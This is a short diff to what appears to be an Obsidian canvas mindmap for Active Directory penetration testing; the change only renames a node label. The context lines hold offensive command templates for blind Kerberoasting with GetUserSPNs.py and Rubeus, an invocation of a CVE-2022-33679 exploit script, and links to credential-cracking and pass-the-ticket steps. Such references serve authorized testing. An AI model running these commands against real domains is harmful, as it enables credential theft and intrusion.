@@ -13,7 +13,7 @@
 		{"id":"95ea4eaae847bf66","type":"text","text":"# HASH  FOUND (ASREP)","x":-83,"y":305,"width":383,"height":50,"color":"2"},
 		{"id":"9e979a56078c4ef0","type":"text","text":"# Blind Kerberoasting\n\n>[!info] Theory\n>- 404 not found\n\n```shell\n🟣 GetUserSPNs.py -no-preauth '<asrep_user>' -userfile '<username_list>' -dc-host '<dc_ip>' '<domain>'/\n🔵 Rubeus.exe kerberoast /domain:'<domain>' /dc:'<dc_ip>' /nopreauth:'<asrep_user>' /spns:'<users.list>'\n```","x":-601,"y":560,"width":1036,"height":300},
 		{"id":"672a0838363045ac","type":"text","text":"# 💥 CVE-2022-33679\n>[!info] Theory\n>- https://www.login-securite.com/blog/analyse-et-poc-de-la-cve-2022-33679\n\n```bash\n ⚪ python3 CVE-2022-33679.py '<domain>'/'<user>' '<target>'\n```","x":-601,"y":907,"width":1036,"height":273},
-		{"id":"be76f92c8ea52cd7","type":"text","text":"# HASH  FOUND (TS)","x":520,"y":685,"width":340,"height":50,"color":"2"},
+		{"id":"be76f92c8ea52cd7","type":"text","text":"# HASH  FOUND (TGS)","x":520,"y":685,"width":340,"height":50,"color":"2"},
 		{"id":"37d8ef8eb74b8088","type":"text","text":"# LATERAL MOVE (PTT)","x":520,"y":1019,"width":371,"height":50,"color":"6"},
 		{"id":"84ca3820817d08b7","type":"file","file":"ATTACKS/GOT CREDENTIALS.canvas","x":1280,"y":-877,"width":920,"height":600,"color":"4"},
 		{"id":"534a33258e9ea284","type":"file","file":"ATTACKS/CRACKING HASH.canvas","x":1280,"y":64,"width":920,"height":600,"color":"2"},
